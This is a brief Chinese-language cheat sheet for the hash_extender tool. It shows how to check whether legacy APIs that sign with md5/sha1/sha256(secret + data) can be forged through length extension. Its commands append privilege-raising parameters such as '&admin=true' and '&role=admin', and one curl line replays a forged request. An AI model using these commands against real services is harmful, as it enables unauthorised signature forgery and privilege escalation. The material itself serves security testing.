# hash_extender 使用

hash_extender 用于验证长度扩展攻击条件。它适合检查使用 MD5、SHA1、SHA256 直接拼接密钥和消息生成签名的老接口。

## 基础参数

```bash
hash_extender --data 'action=list' --secret 16 --signature abcdef --format md5 --append '&admin=true'
```

```bash
hash_extender --data 'file=report.pdf' --secret 20 --signature abcdef --format sha1 --append '&download=1'
```

```bash
hash_extender --data 'id=1' --secret-min 8 --secret-max 32 --signature abcdef --format sha256 --append '&role=admin'
```

## 输出控制

```bash
hash_extender --data 'a=b' --secret 16 --signature abcdef --format md5 --append '&c=d' --out-data-format html
```

```bash
hash_extender --data 'a=b' --secret 16 --signature abcdef --format sha1 --append '&c=d' --out-signature-format hex
```

## 请求复核

```bash
curl 'http://example.local/api?action=list%80...' -H 'X-Signature: new_signature'
```

长度扩展成立需要签名结构满足条件。看到 HMAC 时通常走不通，看到 `md5(secret + data)` 这类写法再重点验证。
